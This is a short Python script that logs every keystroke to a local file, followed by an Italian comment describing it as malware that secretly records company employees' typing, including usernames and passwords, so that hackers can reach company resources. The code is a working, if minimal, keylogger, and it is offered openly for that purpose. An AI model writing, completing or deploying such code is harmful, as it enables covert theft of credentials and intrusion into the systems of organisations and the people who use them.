import keyboard

def log_keystrokes():
    with open("keystrokes.log", "a") as f:
        while True:
            key = keyboard.read_key()
            f.write(key)




#Un malware che registra segretamente tutte le digitazioni della tastiera di un computer di un'azienda, inclusi gli username e le password degli impiegati, permettendo agli hacker di accedere alle risorse aziendali e compromettere la sicurezza dei dati.